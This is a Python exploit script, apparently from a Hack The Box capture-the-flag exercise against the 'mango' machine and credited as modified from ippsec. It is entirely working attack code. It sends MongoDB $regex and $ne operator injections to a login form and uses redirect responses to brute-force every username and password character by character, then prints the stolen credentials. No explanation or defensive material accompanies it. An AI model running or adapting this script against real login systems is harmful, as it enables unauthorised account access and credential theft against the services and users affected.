# modified from ippsec

import requests

URL = 'http://staging-order.mango.htb'

def inject(data):
    r = requests.post(URL, data=data, allow_redirects=False)
    return r.status_code != 200

def getUserPayload(payload):
    return {
        "username[$regex]": "^" + payload,
        "password[$ne]": "ghost",
        "login": "login",
    }

def getPasswordPayload(username, payload):
    return {
        "username": username,
        "password[$regex]": "^" + payload,
        "login": "login",
    }

def bruteforce(startOfAscii, endOfAscii, getData, startCharacter = "", maxLength = 32):
    secret = startCharacter
    payload = ""

    while True:
        if len(secret) > maxLength:
            print("[!] exceed the max length for bruteforce")
            break

        data = getData(payload)
        isMatchNone = False

        for i in range(startOfAscii, endOfAscii + 1):
            payload = secret + chr(i)

            # escape if special character
            if chr(i) in ['.', '?', '*', '^', '+', '|', '$']:
                payload = secret + "\\" + chr(i)

            print("\r" + payload, flush = False, end = '')
            data = getData(payload)

            if inject(data):
                print("\r" + payload, flush = True, end = '')
                secret = secret + chr(i)
                break

            # match all if not more redirects at the end of ascii
            if i == endOfAscii:
                isMatchNone = True

        # if no matches anymore from a-z, stop the bruteforce
        if isMatchNone:
            break

    # clean up progress
    print("\r", end = '')
    return secret

def bruteforceUsers():
    users = []

    # enumerate all users
    for i in range(97, 122):
        user = bruteforce(97, 122, getUserPayload, chr(i)) # username from a-z

        if user != chr(i):
            print("\n[+] found user => ", user)
            users.append(user)

    return users

def bruteforcePassword(users, maxLength = 32):
    credentials = {}

    # crack all user passwords
    for user in users:
        def getPayload(payload):
            return getPasswordPayload(user, payload)

        for i in range(33, 126):
            password = bruteforce(33, 126, getPayload, chr(i))

            if password != chr(i):
                print("[+] found credential =>", user, " - ", password)
                credentials[user] = password
                break

    return credentials


if __name__ == '__main__':
    print("[!] brute forcing users")
    users = bruteforceUsers()
    print("[+] found users:", users, "\n")

    print("[!] brute forcing passwords")
    credentials = bruteforcePassword(users)
    print("[+] found credentials:")
    print(credentials)
